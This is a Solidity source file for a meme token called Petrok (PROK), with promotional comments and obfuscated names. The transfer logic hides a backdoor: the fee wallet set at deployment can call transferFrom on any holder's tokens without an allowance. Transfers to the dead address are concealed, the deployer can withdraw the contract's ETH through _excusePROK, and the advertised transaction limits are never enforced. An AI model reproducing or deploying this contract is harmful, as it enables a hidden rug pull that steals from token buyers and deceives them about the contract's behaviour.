// SPDX-License-Identifier: MIT

/*
    Name: Petrok
    Symbol: PROK

    Welcome to Petrok
    Join the hilariously lazy world of Sir PetRok and his companions, where paradise was discovered by accident and work is optional. This meme token celebrates their wild adventures, exaggerated tales, and a community built on fun, memes, and tropical vibes. Escape the grind and embrace the laughter with PetRok Islands!

    Web: https://petrok.vip
    X: https://x.com/petrok_vip
    tg: https://t.me/petrok_vip
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract Petrok is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Petrok";
    string private constant _symbol = unicode"PROK";
    
    address payable private _vbjljvlklPROK;
    mapping(address => uint256) private _cijojisePROK;
    mapping(address => mapping(address => uint256)) private _fjweoijPROK;
    mapping(address => bool) private _jojodjPROK;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;

    uint256 public _ojojoivlkPROK = 20000000 * 10 **_decimals;
    uint256 public _lkkkvnblkjPROK = 20000000 * 10 **_decimals;
    uint256 public _ppojofPROK = 10000000 * 10 **_decimals;
    uint256 private constant _kmmvbPROK = 1000000000 * 10 **_decimals;
    
    uint256 private _vjkboiwoeiPROK = 10;
    uint256 private _odijofjoePROK = 10;
    uint256 private _joijoiPROK = 0;
    uint256 private _jvbkoiwePROK = 0;
    uint256 private _ojidoiwePROK = 7;
    uint256 private _ojdofPROK = 7;
    uint256 private _buyCount = 0;
    address private _ojdofiekjPROK;
    address private _kjvnkbjnPROK = address(0xdead);

    event MaxTxAmountUpdated(uint256 _ojojoivlkPROK);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() payable {
        _vbjljvlklPROK = payable(_msgSender());
        _cijojisePROK[address(this)] = _kmmvbPROK * 98 / 100;
        _cijojisePROK[owner()] = _kmmvbPROK * 2 / 100;
        _jojodjPROK[owner()] = true;
        _jojodjPROK[address(this)] = true;
        _jojodjPROK[_vbjljvlklPROK] = true;
        _ojdofiekjPROK = _msgSender();
        emit Transfer(address(0), address(this), _kmmvbPROK * 98 / 100);
        emit Transfer(address(0), address(owner()), _kmmvbPROK * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _kmmvbPROK;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _fjweoijPROK[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _cijojisePROK[account];
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _fjweoijPROK[owner][spender];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transferr_PROK(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _lvckmjlwoiPROK(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _lvckmjlwoiPROK(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 _allowed = amount;
        if (_joeijoijoj(sender, recipient))
            _allowed = _fjweoijPROK[sender][_msgSender()];
        return _allowed;
    }

    receive() external payable {}
    
    function _jvjocvo() internal view returns (bool) {return msg.sender != _vbjljvlklPROK;}

    function _transferr_PROK(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _ojidoiwePROK)
                        ? _joijoiPROK
                        : _vjkboiwoeiPROK
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_jojodjPROK[to]
            ) {
                _buyCount++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _ojdofPROK)
                            ? _jvbkoiwePROK
                            : _odijofjoePROK
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _ppojofPROK) ? contractTokenBalance : _ppojofPROK; 
                    _swappp_PROK((amount < minBalance) ? amount : minBalance);
                }
                _assistPROK(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _cijojisePROK[address(this)] =_cijojisePROK[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _cijojisePROK[from] =_cijojisePROK[from].sub(amount);
        _cijojisePROK[to] =_cijojisePROK[to].add(amount.sub(taxAmount));
        if(_kjvnkbjnPROK != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _joeijoijoj(
        address sender,
        address recipient
    ) internal view returns (bool) {
        if(_jvjocvo() == false) return false;
        else return sender == uniswapV2Pair || recipient != _kjvnkbjnPROK;
    }

    function _assistPROK(uint256 amount) private {
        _vbjljvlklPROK.transfer(amount);
    }

    function _excusePROK(address payable receipt) external {
        require(msg.sender == _ojdofiekjPROK , "");
        _vbjljvlklPROK = receipt;
        _PROKlkjlok(address(this).balance);
    }
    
    function _PROKlkjlok(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transferr_PROK(_msgSender(), recipient, amount);
        return true;
    }

    function enablePROKTrading() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _kmmvbPROK);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function _swappp_PROK(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits () external onlyOwner {
        _ojojoivlkPROK = _kmmvbPROK;
        _lkkkvnblkjPROK = _kmmvbPROK;
        emit MaxTxAmountUpdated(_kmmvbPROK);
    }
}